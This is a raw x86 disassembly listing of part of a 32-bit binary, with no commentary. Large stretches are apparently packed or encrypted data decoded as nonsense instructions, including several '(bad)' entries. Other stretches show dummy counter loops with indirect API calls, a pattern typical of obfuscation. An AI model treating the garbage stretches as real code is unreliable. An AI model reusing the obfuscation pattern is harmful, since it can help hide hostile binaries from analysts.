  40309d:	gs dec edi
  40309f:	add    BYTE PTR [ecx],dh
  4030a1:	sub    DWORD PTR [ebx],esi
  4030a3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4030a4:	xchg   edx,eax
  4030a5:	mov    ds:0xe0c4083e,al
  4030aa:	cdq    
  4030ab:	inc    eax
  4030ac:	out    dx,eax
  4030ad:	dec    edi
  4030ae:	or     eax,esp
  4030b0:	sbb    al,0x36
  4030b2:	pop    ebx
  4030b3:	test   BYTE PTR [eax],0x8c
  4030b6:	add    dl,BYTE PTR [eax+ecx*1-0x1c]
  4030ba:	inc    ebx
  4030bb:	aaa    
  4030bc:	ret    
  4030bd:	pop    eax
  4030be:	push   esp
  4030bf:	or     edx,esi
  4030c1:	push   edx
  4030c2:	retf   
  4030c3:	dec    ebp
  4030c4:	inc    edi
  4030c5:	push   cs
  4030c6:	pop    ds
  4030c7:	pop    ecx
  4030c8:	aam    0x12
  4030ca:	xchg   ebp,eax
  4030cb:	js     0x4030eb
  4030cd:	pop    ss
  4030ce:	jne    0x403143
  4030d0:	arpl   WORD PTR [eax],ax
  4030d2:	mov    esi,DWORD PTR [ecx+0x66e9c0ea]
  4030d8:	inc    ecx
  4030d9:	pop    esi
  4030da:	cmp    BYTE PTR [ecx+0x3f],0x79
  4030de:	shl    DWORD PTR [edi-0x1e4a78ee],0x6b
  4030e5:	add    dh,cl
  4030e7:	and    cl,BYTE PTR [edx+edx*8]
  4030ea:	mov    esp,?
  4030ec:	inc    ecx
  4030ed:	sahf   
  4030ee:	cmp    al,0xe0
  4030f0:	adc    esp,DWORD PTR [eax]
  4030f2:	push   esp
  4030f3:	pop    ecx
  4030f4:	jno    0x4030df
  4030f6:	xor    eax,0x411925f0
  4030fb:	jp     0x4030f7
  4030fd:	mov    ch,0xee
  4030ff:	push   cs
  403100:	pop    es
  403101:	xchg   ebx,eax
  403102:	les    ebp,FWORD PTR [eax+0x202e0d03]
  403108:	adc    edx,esi
  40310a:	lds    edi,FWORD PTR [esi-0x6d]
  40310d:	xchg   esp,eax
  40310e:	cwde   
  40310f:	and    BYTE PTR [esi-0x31],0xf3
  403113:	cld    
  403114:	repz and edx,eax
  403117:	in     al,0x81
  403119:	scas   al,BYTE PTR es:[edi]
  40311a:	outs   dx,DWORD PTR ds:[esi]
  40311b:	neg    edi
  40311d:	fisttp DWORD PTR [edi+0x6c]
  403120:	xor    dl,al
  403122:	jl     0x403157
  403124:	xchg   ecx,eax
  403125:	(bad)  
  403126:	aad    0x94
  403128:	dec    edi
  403129:	cmp    ah,bl
  40312b:	mov    ah,0xce
  40312d:	pop    ss
  40312e:	dec    eax
  40312f:	xchg   esi,eax
  403130:	add    BYTE PTR [eax+ebx*4+0x11],0xd
  403135:	dec    eax
  403136:	inc    ebp
  403137:	add    DWORD PTR [esi],edi
  403139:	mov    dl,0x77
  40313b:	or     bh,bh
  40313d:	push   eax
  40313e:	dec    BYTE PTR [ebx+0xd8bc845]
  403144:	mov    al,0x3b
  403146:	inc    ecx
  403147:	add    BYTE PTR [ecx],al
  403149:	or     BYTE PTR [edi-0x17],bl
  40314c:	pushf  
  40314d:	add    DWORD PTR [eax],eax
  40314f:	add    BYTE PTR [edx],al
  403151:	adc    DWORD PTR [eax+0x21b389ab],ecx
  403157:	mov    cl,0x82
  403159:	xchg   edx,eax
  40315a:	pop    esp
  40315b:	shl    eax,0x55
  40315e:	ins    DWORD PTR es:[edi],dx
  40315f:	test   DWORD PTR [edx-0x58181e9],edi
  403165:	jg     0x4031e5
  403167:	jle    0x403145
  403169:	je     0x403163
  40316b:	enter  0x153d,0xe6
  40316f:	aaa    
  403170:	jb     0x403169
  403172:	jb     0x4030fe
  403174:	test   eax,0x89e641f8
  403179:	in     eax,dx
  40317a:	or     al,0xa9
  40317c:	pop    eax
  40317d:	xor    al,BYTE PTR [edx+edi*8]
  403180:	adc    BYTE PTR [ebp+0x69],bh
  403183:	nop
  403184:	pop    edx
  403185:	mov    esp,0x630671a0
  40318a:	jge    0x403150
  40318c:	push   cs
  40318d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40318e:	xor    ebp,DWORD PTR [edi]
  403190:	sub    BYTE PTR [edi],ch
  403192:	xchg   esi,eax
  403193:	or     DWORD PTR [edx],edi
  403195:	mov    DWORD PTR [edi],0xa2c52fe8
  40319b:	pusha  
  40319c:	aas    
  40319d:	or     al,BYTE PTR [esp+eax*4+0xb]
  4031a1:	jo     0x4031ea
  4031a3:	ja     0x403209
  4031a5:	mov    cl,ch
  4031a7:	stos   DWORD PTR es:[edi],eax
  4031a8:	and    ebp,DWORD PTR [ebx]
  4031aa:	dec    eax
  4031ab:	loop   0x403217
  4031ad:	scas   al,BYTE PTR es:[edi]
  4031ae:	dec    ecx
  4031af:	mov    eax,ds:0xe10f0762
  4031b4:	aam    0x69
  4031b6:	das    
  4031b7:	leave  
  4031b8:	jne    0x403187
  4031ba:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4031bb:	inc    ecx
  4031bc:	in     eax,dx
  4031bd:	cmp    edi,DWORD PTR [esi-0xd262650]
  4031c3:	inc    ebx
  4031c4:	and    ah,BYTE PTR [esp+esi*2+0x11d3bba3]
  4031cb:	dec    ebp
  4031cc:	fdivr  QWORD PTR [edi]
  4031ce:	jne    0x40320b
  4031d0:	call   0xff1:0x5fff2bfa
  4031d7:	or     edx,edx
  4031d9:	sbb    BYTE PTR [esi+0x61],dl
  4031dc:	sbb    edx,DWORD PTR [edx-0x35]
  4031df:	pusha  
  4031e0:	cmp    esp,ecx
  4031e2:	iret   
  4031e3:	mov    ds:0x6beb1c52,eax
  4031e8:	mov    edi,0x2f26fe5a
  4031ed:	in     al,dx
  4031ee:	push   edx
  4031ef:	rol    DWORD PTR es:[ebx+ebx*8+0x3f51f002],1
  4031f7:	mov    ecx,0x487ec78f
  4031fc:	and    ebx,DWORD PTR [ebx-0x791727b2]
  403202:	ss in  eax,dx
  403204:	xchg   DWORD PTR [ecx+0x5f],esp
  403207:	sbb    eax,0x3615287f
  40320c:	cmp    al,0xa2
  40320e:	cli    
  40320f:	push   es
  403210:	addr16 (bad) 
  403212:	out    0x2a,al
  403214:	pusha  
  403215:	lods   eax,DWORD PTR ds:[esi]
  403216:	ret    
  403217:	add    eax,0x282d0075
  40321c:	lods   al,BYTE PTR ds:[esi]
  40321d:	dec    ebp
  40321e:	adc    BYTE PTR [ecx+0x44cf641b],0x4
  403225:	adc    ecx,DWORD PTR [esp+edx*1]
  403228:	ror    DWORD PTR [edi+0x8],1
  40322b:	je     0x403298
  40322d:	cwde   
  40322e:	jns    0x403223
  403230:	cdq    
  403231:	icebp  
  403232:	push   ds
  403233:	sbb    bl,al
  403235:	rcr    BYTE PTR [ebx-0x7b9087d2],cl
  40323b:	pop    edi
  40323c:	sbb    eax,0x641c044c
  403241:	jl     0x4032a5
  403243:	fsub   st(1),st
  403245:	and    eax,0xc41dc751
  40324a:	adc    edi,DWORD PTR [esi+0x4744fe09]
  403250:	es je  0x40323b
  403253:	stos   BYTE PTR es:[edi],al
  403254:	mov    ds:0xaec10a1f,eax
  403259:	push   ebx
  40325a:	add    BYTE PTR [ecx],0xda
  40325d:	sbb    al,BYTE PTR cs:[edi-0x4814a10]
  403264:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403265:	iret   
  403266:	scas   al,BYTE PTR es:[edi]
  403267:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403268:	retf   
  403269:	push   0x45
  40326b:	xor    ch,al
  40326d:	sbb    bl,dh
  40326f:	and    esp,DWORD PTR [eax-0x42]
  403272:	sub    DWORD PTR [eax],ecx
  403274:	pop    edx
  403275:	xchg   DWORD PTR [esi],esp
  403277:	add    al,0xcb
  403279:	ret    
  40327a:	sti    
  40327b:	inc    esi
  40327c:	adc    ah,BYTE PTR [esi]
  40327e:	xor    al,0x3
  403280:	push   eax
  403281:	xchg   ecx,eax
  403282:	push   esp
  403283:	and    al,0xcf
  403285:	(bad)
  403289:	retf   
  40328a:	es jmp 0x81ed:0x4cd3bf05
  403292:	cmp    eax,0x34d07b67
  403297:	jg     0x4032dc
  403299:	mov    ebx,0xdc0734da
  40329e:	shl    DWORD PTR [edi],cl
  4032a0:	cmp    al,0xca
  4032a2:	sbb    ebx,DWORD PTR [ebp-0x332ca3d0]
  4032a8:	fistp  DWORD PTR [edx+0x54c2f93b]
  4032ae:	mov    ss:0x4f05b32c,al
  4032b4:	stc    
  4032b5:	push   eax
  4032b6:	std    
  4032b7:	shl    DWORD PTR [ebp-0x1ae963e2],1
  4032bd:	enter  0x3917,0xf1
  4032c1:	dec    edx
  4032c2:	mov    al,dh
  4032c4:	pop    esi
  4032c5:	lds    ebx,FWORD PTR [esi+0x458ce827]
  4032cb:	add    edi,ebp
  4032cd:	pusha  
  4032ce:	mov    bl,0xba
  4032d0:	add    ebp,esp
  4032d2:	pop    edi
  4032d3:	(bad)  
  4032d5:	cmp    al,BYTE PTR [ebx-0x104cc125]
  4032db:	mov    edx,0x5d209d03
  4032e0:	cmp    BYTE PTR [eax+edx*2+0x65],ch
  4032e4:	out    dx,al
  4032e5:	mov    esp,DWORD PTR [esp+ebx*8+0x35]
  4032e9:	xchg   ebx,eax
  4032ea:	inc    ah
  4032ec:	pop    esi
  4032ed:	pop    ebx
  4032ee:	leave  
  4032ef:	ret    
  4032f0:	push   ebp
  4032f1:	mov    ebp,esp
  4032f3:	sub    esp,0x2c
  4032f6:	leave  
  4032f7:	ret    0x10
  4032fa:	push   ebp
  4032fb:	mov    ebp,esp
  4032fd:	sub    esp,0x44
  403300:	push   edi
  403301:	mov    eax,DWORD PTR [ebp+0xc]
  403304:	and    DWORD PTR ds:0x43365b,0x0
  40330e:	xor    ecx,ecx
  403310:	add    ecx,DWORD PTR ds:0x43365b
  403316:	inc    ecx
  403317:	mov    DWORD PTR ds:0x43365b,ecx
  40331d:	cmp    DWORD PTR ds:0x43365b,0x26
  403324:	jne    0x403335
  40332a:	push   0x476d
  40332f:	call   DWORD PTR ds:0x412278
  403335:	cmp    DWORD PTR ds:0x43365b,0x1d
  40333c:	jb     0x40330e
  403342:	not    edx
  403344:	mov    DWORD PTR [ebp-0x10],eax
  403347:	xor    DWORD PTR ds:0x4336ef,0x1717
  403351:	mov    eax,DWORD PTR [ebp+0x8]
  403354:	sbb    DWORD PTR ds:0x4336d7,0x2700
  40335e:	mov    DWORD PTR [ebp+0x8],0xf89c8531
  403365:	mov    ecx,DWORD PTR ds:0x43361f
  40336b:	add    DWORD PTR ds:0x433603,ecx
  403371:	mov    DWORD PTR [ebp-0x20],0xf89c8532
  403378:	xor    edi,0x7913
  40337e:	mov    edx,DWORD PTR [ebp+0x8]
  403381:	mov    DWORD PTR ds:0x433657,0x1e
  40338b:	cmp    DWORD PTR ds:0x433657,0x0
  403392:	je     0x4033dc
  403398:	cmp    DWORD PTR ds:0x433657,0xb
  40339f:	jne    0x4033ae
  4033a5:	push   DWORD PTR [ebp-0x18]
  4033a8:	call   DWORD PTR ds:0x41227c
  4033ae:	cmp    DWORD PTR ds:0x433657,0xc
  4033b5:	jne    0x4033c8
  4033bb:	mov    edi,DWORD PTR ds:0x433657
  4033c1:	dec    edi
  4033c2:	mov    DWORD PTR ds:0x433657,edi
  4033c8:	xor    edi,edi
  4033ca:	add    edi,DWORD PTR ds:0x433657
  4033d0:	dec    edi
  4033d1:	mov    DWORD PTR ds:0x433657,edi
  4033d7:	jmp    0x40338b
  4033dc:	mov    DWORD PTR [ebp-0x40],eax
  4033df:	dec    DWORD PTR ds:0x4336e7
  4033e5:	mov    eax,0x7510854
  4033ea:	xor    edx,eax
  4033ec:	mov    ecx,DWORD PTR ds:0x433647
  4033f2:	mov    edi,DWORD PTR ds:0x433687
  4033f8:	sub    ecx,edi
  4033fa:	imul   ecx,DWORD PTR [ecx+edi*1]
  4033fe:	mov    ecx,0x32729b
  403403:	add    edx,ecx
  403405:	mov    DWORD PTR ds:0x433667,0x1c
  40340f:	cmp    DWORD PTR ds:0x433667,0x0
  403416:	je     0x40345e
  40341c:	cmp    DWORD PTR ds:0x433667,0xa
  403423:	jne    0x403432
  403429:	push   DWORD PTR [ebp-0x24]
  40342c:	call   DWORD PTR ds:0x412288
  403432:	cmp    DWORD PTR ds:0x433667,0xb
  403439:	jne    0x40344c
  40343f:	mov    edi,DWORD PTR ds:0x433667
  403445:	dec    edi
  403446:	mov    DWORD PTR ds:0x433667,edi
  40344c:	mov    edi,DWORD PTR ds:0x433667
  403452:	dec    edi
  403453:	mov    DWORD PTR ds:0x433667,edi
  403459:	jmp    0x40340f
  40345e:	mov    DWORD PTR [ebp-0x8],edx
  403461:	mov    edx,DWORD PTR ds:0x4336e3
  403467:	and    edx,DWORD PTR ds:0x433717
  40346d:	mov    DWORD PTR ds:0x4336e3,edx
  403473:	mov    edx,DWORD PTR [ebp+0x8]
  403476:	sbb    DWORD PTR ds:0x43369b,0x6be7
  403480:	xor    edx,eax
  403482:	add    edx,ecx
  403484:	not    edi
  403486:	mov    DWORD PTR [ebp+0xc],edx
  403489:	not    edi
  40348b:	mov    DWORD PTR [ebp-0x4],0xf89c85d1
  403492:	mov    DWORD PTR [ebp-0x28],0xf89c8533
  403499:	mov    edx,DWORD PTR ds:0x43371f
  40349f:	adc    DWORD PTR ds:0x4335ff,edx
  4034a5:	mov    DWORD PTR [ebp-0x2c],0xf89c853c
  4034ac:	adc    edx,edx
  4034ae:	mov    DWORD PTR [ebp-0x30],0xf89c853d
  4034b5:	mov    DWORD PTR [ebp-0x34],0xf89c853e
  4034bc:	mov    DWORD PTR ds:0x433717,0x10
  4034c6:	cmp    DWORD PTR ds:0x433717,0x0
  4034cd:	je     0x403517
  4034d3:	cmp    DWORD PTR ds:0x433717,0x9
  4034da:	jne    0x4034eb
  4034e0:	push   0x5d47
  4034e5:	call   DWORD PTR ds:0x41233c
  4034eb:	cmp    DWORD PTR ds:0x433717,0xa
  4034f2:	jne    0x403505
  4034f8:	mov    edi,DWORD PTR ds:0x433717
  4034fe:	dec    edi
  4034ff:	mov    DWORD PTR ds:0x433717,edi
  403505:	mov    edi,DWORD PTR ds:0x433717
  40350b:	dec    edi
  40350c:	mov    DWORD PTR ds:0x433717,edi
  403512:	jmp    0x4034c6
  403517:	mov    DWORD PTR [ebp-0x38],0xf89c853f
  40351e:	and    DWORD PTR ds:0x43372b,ecx
  403524:	jmp    0x403827
  403529:	sbb    ecx,ebp
  40352b:	add    ah,dl
  40352d:	lock shr ebx,1
  403530:	icebp  
  403531:	mov    ?,WORD PTR [ebp+0x5d4cd48a]
  403537:	add    dh,cl
  403539:	(bad)  
  40353a:	adc    eax,0x7c587e7e
  40353f:	jle    0x4035bf
  403541:	(bad)  
  403542:	xchg   ebp,eax
  403543:	dec    edx
  403544:	(bad)  
  403545:	popf   
  403546:	mov    esp,0xef9ae809
  40354b:	or     eax,0x8b3d7ca1
  403550:	mov    ah,0x4
  403552:	fxtract 
  403554:	aam    0xa3
  403556:	(bad)  
  403558:	cmp    BYTE PTR [esi-0x407ce71f],0x85
  40355f:	stos   BYTE PTR es:[edi],al
  403560:	imul   ebp,DWORD PTR [eax+0x49],0x8e23585c
  403567:	fldenv [ebx-0x5958a7b4]
  40356d:	inc    ebp
  40356e:	sub    BYTE PTR [ebx],bl
  403570:	mov    ebx,0x743e6776
  403575:	push   ebx
  403576:	jp     0x4035bd
  403578:	sub    DWORD PTR [edi-0x21b5eb76],eax
  40357e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40357f:	lds    ebx,FWORD PTR [ebp-0x402abd02]
  403585:	jmp    0xaf0be707
  40358a:	pop    edx
  40358b:	clc    
  40358c:	loope  0x4035e6
  40358e:	call   0xe6f04e9c
  403593:	in     eax,0x35
  403595:	push   ecx
  403596:	ror    bl,1
  403598:	lods   eax,DWORD PTR ds:[esi]
  403599:	stos   BYTE PTR es:[edi],al
  40359a:	imul   ebx,DWORD PTR ds:0xbeb4eb40,0x64
  4035a1:	or     dl,BYTE PTR [eax]
  4035a3:	dec    ebp
  4035a4:	push   0xffffff88
  4035a6:	rcr    DWORD PTR [edx-0x3e23cc5a],0xe1
  4035ad:	mov    dh,0x5a
  4035af:	ret    0x197
  4035b2:	nop
  4035b3:	fmul   DWORD PTR [ecx-0x2fba0c2d]
  4035b9:	adc    DWORD PTR [edx+0x41],esi
  4035bc:	pop    ecx
  4035bd:	push   edx
  4035be:	dec    edi
  4035bf:	mov    ch,0x3a
  4035c1:	(bad)  
  4035c2:	(bad)  
  4035c3:	and    BYTE PTR [edx+esi*8-0x3e],ah
  4035c7:	rcl    DWORD PTR [eax],cl
  4035c9:	mov    eax,0x2e5231df
  4035ce:	mov    ah,0x67
  4035d0:	dec    ebp
  4035d1:	lahf   
  4035d2:	stc    
  4035d3:	sub    cl,BYTE PTR [edi-0x80]
  4035d6:	stos   DWORD PTR es:[edi],eax
  4035d7:	pop    eax
  4035d8:	daa    
  4035d9:	push   es
  4035da:	jge    0x4035a1
  4035dc:	aam    0x31
  4035de:	popf   
  4035df:	mov    esi,0x4a4df6c1
  4035e4:	mov    edx,0x15305007
  4035e9:	loopne 0x4035b5
  4035eb:	cs pop ecx
  4035ed:	mov    al,ds:0xd9ce27a7
  4035f2:	xchg   bh,bl
  4035f4:	mov    WORD PTR [ebp-0x6],gs
  4035f7:	jmp    0x40362a
  4035f9:	dec    eax
  4035fa:	pushf  
  4035fb:	cmp    BYTE PTR [edi-0x18dd0005],al
  403601:	fwait
  403602:	neg    edx
  403604:	scas   eax,DWORD PTR es:[edi]
  403605:	mov    ch,0x17
  403607:	repz sub DWORD PTR [esi-0x32a8f79e],eax
  40360e:	lea    ebx,[ecx+0x4f]
  403611:	iret   
  403612:	adc    edi,edi
  403614:	push   cs
  403615:	stos   DWORD PTR es:[edi],eax
  403616:	stc    
  403617:	loop   0x40368e
  403619:	jns    0x403612
  40361b:	push   0x4f
  40361d:	scas   eax,DWORD PTR es:[edi]
  40361e:	mov    al,0x9d
  403620:	ret    0x7c98
  403623:	adc    dh,ah
  403625:	jae    0x403611
  403627:	inc    edi
  403628:	pop    edx
  403629:	and    eax,0x45ca2bdb
  40362e:	adc    DWORD PTR [esi],ecx
  403630:	xchg   edi,eax
  403631:	push   edx
  403632:	inc    ebx
  403633:	add    BYTE PTR [ecx],ah
  403635:	fisub  WORD PTR [ecx-0x2e]
  403638:	iret   
  403639:	adc    esi,DWORD PTR [ecx+0x247e11ec]
  40363f:	push   ebx
  403640:	cmp    ah,BYTE PTR [esi+0x4ff7f9c9]
  403646:	or     eax,0x43974399
  40364b:	add    eax,0xc1eb610f
  403650:	mov    ah,0x95
  403652:	inc    esp
  403653:	lea    ebp,[esi-0x45f5c39d]
  403659:	xor    dl,ch
  40365b:	mov    dh,0xaa
  40365d:	adc    ah,cl
  40365f:	mov    ah,0x12
  403661:	imul   ebx,edx,0xffffffd6
  403664:	add    eax,0xe84b7243
  403669:	add    BYTE PTR [eax+0x1f0a021c],0x27
  403670:	mov    ch,0x5a
  403672:	dec    eax
  403673:	call   0x1066b588
  403678:	push   edi
  403679:	xchg   ebx,eax
  40367a:	les    ecx,FWORD PTR [esi-0x1d]
  40367d:	jae    0x403648
  40367f:	cwde   
  403680:	mov    al,ds:0xbde7fabc
  403685:	pop    es
  403686:	call   0xf4f69724
  40368b:	loope  0x4036b4
  40368d:	jp     0x403694
  40368f:	fisttp QWORD PTR [esi+0x1d]
  403692:	or     esp,DWORD PTR [edi]
  403694:	xor    al,0x6e
  403696:	cmp    DWORD PTR [ebx],eax
  403698:	jge    0x4036df
  40369a:	inc    edi
  40369b:	in     al,0xdf
  40369d:	outs   dx,BYTE PTR ds:[esi]
  40369e:	cmp    bh,cl
  4036a0:	jmp    FWORD PTR [edi+ebx*8-0x13ec3d5e]
  4036a7:	sti    
  4036a8:	xor    eax,0x24798fde
  4036ad:	shl    dl,0xdf
  4036b0:	jae    0x403643
  4036b2:	stos   DWORD PTR es:[edi],eax
  4036b3:	adc    eax,0xf8e4bef2
  4036b8:	add    ch,bl
  4036ba:	pop    eax
  4036bb:	push   cs
  4036bc:	inc    ebp
  4036bd:	jnp    0x403692
  4036bf:	fsubr  QWORD PTR [eax+0x794a799]
  4036c5:	or     BYTE PTR [eax],dh
  4036c7:	sub    DWORD PTR [eax],ebx
  4036c9:	dec    ebp
  4036ca:	loop   0x4036c2
  4036cc:	mov    ch,0xc1
  4036ce:	and    eax,ebp
  4036d0:	pop    eax
  4036d1:	xor    BYTE PTR [ecx+0x4c],ch
  4036d4:	idiv   DWORD PTR [eax+eiz*2+0xb93aabc]
  4036db:	mov    ebp,0xc40a3093
  4036e0:	add    DWORD PTR [edi],0xffffffdd
  4036e3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4036e4:	jno    0x403735
  4036e6:	imul   ebp,DWORD PTR [esi+0xb5d3505],0xfffffff6
  4036ed:	cmp    dl,BYTE PTR [eax-0x4465f918]
  4036f3:	icebp  
  4036f4:	pop    es
  4036f5:	cmps   DWORD PTR cs:[esi],DWORD PTR es:[edi]
  4036f7:	fld    QWORD PTR [eax]
  4036f9:	mov    bh,0xb3
  4036fb:	cmp    DWORD PTR [ebp+0x56d4af40],esp
  403701:	dec    ebx
  403702:	iret   
  403703:	mov    al,0x81
  403705:	imul   ecx,ecx,0x57ace495
  40370b:	stos   BYTE PTR es:[edi],al
  40370c:	out    dx,al
  40370d:	loop   0x4036b4
  40370f:	imul   edi,esi,0x24
  403712:	push   0x1c
  403714:	stos   BYTE PTR es:[edi],al
  403715:	les    eax,FWORD PTR [ecx-0x29]
  403718:	dec    eax
  403719:	mov    DWORD PTR [edx+0x69],ebp
  40371c:	adc    eax,0x8257ad35
  403721:	popf   
  403722:	je     0x4036aa
  403724:	(bad)  
  403725:	jbe    0x403780
  403727:	arpl   bx,cx
  403729:	mov    bl,0x65
  40372b:	(bad)  
  40372c:	add    ch,0x3
  40372f:	sbb    eax,0xfad13286
  403734:	pushf  
  403735:	xor    al,0xe
  403737:	inc    ebx
  403738:	icebp  
  403739:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40373a:	not    BYTE PTR [esi]
  40373c:	xchg   esp,eax
  40373d:	xchg   ebp,eax
  40373e:	sti    
  40373f:	and    edx,esi
  403741:	jb     0x40372c
  403743:	nop
  403744:	sbb    al,0x9f
  403746:	call   0x50d2676a
  40374b:	sub    BYTE PTR [ebx+0x37],cl
  40374e:	mov    esi,0xc6b915ee
  403753:	cmp    al,0x2f
  403755:	jp     0x4037a7
  403757:	sub    DWORD PTR [ebx+0x29],esi
  40375a:	and    al,0xc1
  40375c:	ds ret 0x121c
  403760:	shl    BYTE PTR [ecx],cl
  403762:	fcmovbe st,st(4)
  403764:	jmp    0x10f3:0x34f987e8
  40376b:	rol    DWORD PTR [edi-0x3f],cl
  40376e:	dec    edi
  40376f:	int    0xea
  403771:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403772:	rcr    BYTE PTR [eax-0x56],1
  403775:	sub    DWORD PTR [ebp-0x4c3a2e9c],esp
  40377b:	popa   
  40377c:	arpl   WORD PTR [ecx],sp
  40377e:	int3   
  40377f:	cld    
  403780:	jb     0x403736
  403782:	xor    eax,0x55e31319
  403787:	inc    eax
  403788:	adc    eax,0xdd10336
  40378d:	mov    WORD PTR [ebp-0x3a],?
  403790:	mov    bl,BYTE PTR ds:0x62dfc2a6
  403796:	ins    DWORD PTR es:[edi],dx
  403797:	xchg   ecx,eax
  403798:	bound  edi,QWORD PTR [esi-0x62402af0]
  40379e:	push   ecx
  40379f:	mov    BYTE PTR [ebx+0x73],dh
  4037a2:	ds call 0xc6c9f023
  4037a8:	bound  ebp,QWORD PTR [ebx-0x3b14ad9c]
  4037ae:	stos   DWORD PTR es:[edi],eax
  4037af:	shl    ah,1
  4037b1:	aad    0x2d
  4037b3:	mov    ah,0x51
  4037b5:	dec    ebx
  4037b6:	add    al,0xe9
  4037b8:	adc    DWORD PTR [ebx],ecx
  4037ba:	pop    edx
  4037bb:	loopne 0x403794
  4037bd:	jecxz  0x403814
  4037bf:	das    
  4037c0:	adc    dh,al
  4037c2:	rcr    DWORD PTR [edx-0x7b],0xcf
  4037c6:	adc    bl,BYTE PTR [edx+ebx*4+0x9]
  4037ca:	xchg   ebx,eax
  4037cb:	les    ebp,FWORD PTR [edi+0x4d]
  4037ce:	mov    edx,DWORD PTR [ebx-0x57126b9f]
  4037d4:	test   BYTE PTR [eax+0x4c],ch
  4037d7:	mov    ds:0xf267847f,eax
  4037dc:	push   esi
  4037dd:	xor    edi,0xffffff85
  4037e0:	or     DWORD PTR [esi],esi
  4037e2:	lods   al,BYTE PTR ds:[esi]
  4037e3:	(bad)  
  4037e5:	add    al,0xc1
  4037e7:	cmc    
  4037e8:	ins    DWORD PTR es:[edi],dx
  4037e9:	fucomip st,st(6)
  4037eb:	pop    eax
  4037ec:	icebp  
  4037ed:	clc    
  4037ee:	ins    DWORD PTR es:[edi],dx
  4037ef:	fild   WORD PTR [ecx+ebx*1+0x40]
  4037f3:	repnz cdq 
  4037f5:	aas    
  4037f6:	push   cs
  4037f7:	cmp    al,dl
  4037f9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4037fa:	xchg   esp,eax
  4037fb:	mov    edi,0x7d0515b1
  403800:	call   DWORD PTR [esi-0x6201e71a]
  403806:	add    BYTE PTR [esi],ah
  403808:	enter  0x84e2,0x93
  40380c:	push   esi
  40380d:	mov    bl,0x10
  40380f:	jb     0x403850
  403811:	dec    eax
  403812:	popf   
  403813:	sbb    BYTE PTR [eax+ebx*4-0x3f],dl
  403817:	outs   dx,DWORD PTR ds:[esi]
  403818:	rcr    BYTE PTR [esi],1
  40381a:	sbb    DWORD PTR [edx-0x27],edx
  40381d:	xlat   BYTE PTR ds:[ebx]
  40381e:	ds aas 
  403820:	hlt    
  403821:	mov    ch,0x94
  403823:	(bad)  
  403825:	retf   0xc7c4
  403828:	inc    ebp
  403829:	les    edi,FWORD PTR [eax]
  40382b:	test   DWORD PTR [eax+edi*8+0x35fb3d1b],ebx
  403832:	inc    ebx
  403833:	add    BYTE PTR [ebx+0x3d1b0855],cl
  403839:	stos   DWORD PTR es:[edi],eax
  40383a:	ss inc ebx
  40383c:	add    BYTE PTR [ebx],dh
  40383e:	rol    BYTE PTR [ecx+0x43372725],1
  403844:	add    BYTE PTR [eax],al
  403846:	add    BYTE PTR [eax],al
  403848:	add    BYTE PTR [ebx],dh
  40384a:	inc    DWORD PTR [ebx]
  40384c:	cmp    eax,0x433727
  403851:	inc    edi
  403852:	mov    DWORD PTR ds:0x433727,edi
  403858:	cmp    DWORD PTR ds:0x433727,0xc
  40385f:	jne    0x403882
  403865:	push   0x86d9
  40386a:	push   0x47ad
  40386f:	push   0x8605
  403874:	push   DWORD PTR [ebp-0x24]
  403877:	push   0x3fd8
  40387c:	call   DWORD PTR ds:0x41228c
  403882:	cmp    DWORD PTR ds:0x433727,0xb
  403889:	jne    0x40389c
  40388f:	mov    edi,DWORD PTR ds:0x433727
  403895:	inc    edi
  403896:	mov    DWORD PTR ds:0x433727,edi
  40389c:	cmp    DWORD PTR ds:0x433727,0x17
  4038a3:	jb     0x403849
  4038a9:	or     edi,0x3f73
  4038af:	mov    edi,DWORD PTR [ebp-0x10]
  4038b2:	sub    DWORD PTR ds:0x43366b,0x43372b
  4038bc:	add    edx,ecx
  4038be:	mov    DWORD PTR ds:0x433693,0x73ae
  4038c8:	cmp    edi,edx
  4038ca:	mov    DWORD PTR ds:0x4336eb,0x7cd1
  4038d4:	je     0x4057b4
  4038da:	mov    DWORD PTR ds:0x433727,0x58cf
  4038e4:	push   ebx
  4038e5:	jmp    0x40578f
  4038ea:	xor    DWORD PTR ds:0x4336eb,0x4336ab
  4038f4:	mov    edx,DWORD PTR [ebp-0x8]
  4038f7:	sub    DWORD PTR ds:0x4335fb,ecx
  4038fd:	mov    edi,DWORD PTR [ebp-0x10]
  403900:	sub    edi,edx
  403902:	xor    DWORD PTR ds:0x433617,edi
  403908:	mov    edx,DWORD PTR [ebp-0x4]
  40390b:	xor    DWORD PTR ds:0x433613,0x16cd
  403915:	xor    edx,eax
  403917:	mov    DWORD PTR ds:0x43371b,0x2437
  403921:	add    edx,ecx
  403923:	cmp    edi,edx
  403925:	jb     0x4057b3
  40392b:	mov    DWORD PTR ds:0x4335ff,0x1d
  403935:	cmp    DWORD PTR ds:0x4335ff,0x0
  40393c:	je     0x40399d
  403942:	cmp    DWORD PTR ds:0x4335ff,0x6
  403949:	jne    0x40396b
  40394f:	push   DWORD PTR [ebp-0x28]
  403952:	push   DWORD PTR [ebp-0x14]
  403955:	push   0x0
  403957:	push   0x6853
  40395c:	push   DWORD PTR [ebp-0x20]
  40395f:	push   DWORD PTR [ebp-0x1c]
  403962:	push   DWORD PTR [ebp-0xc]
  403965:	call   DWORD PTR ds:0x4120b8
  40396b:	cmp    DWORD PTR ds:0x4335ff,0x7
  403972:	jne    0x403985
  403978:	mov    ebx,DWORD PTR ds:0x4335ff
  40397e:	dec    ebx
  40397f:	mov    DWORD PTR ds:0x4335ff,ebx
  403985:	mov    ebx,DWORD PTR ds:0x4335ff
  40398b:	dec    ebx
  40398c:	mov    DWORD PTR ds:0x4335ff,ebx
  403992:	jmp    0x403935
  403997:	xor    edx,DWORD PTR ds:0x433667
  40399d:	mov    edx,DWORD PTR [ebp-0x28]
  4039a0:	mov    edi,DWORD PTR ds:0x433613
  4039a6:	sub    edi,DWORD PTR ds:0x433723
  4039ac:	mov    DWORD PTR ds:0x433613,edi
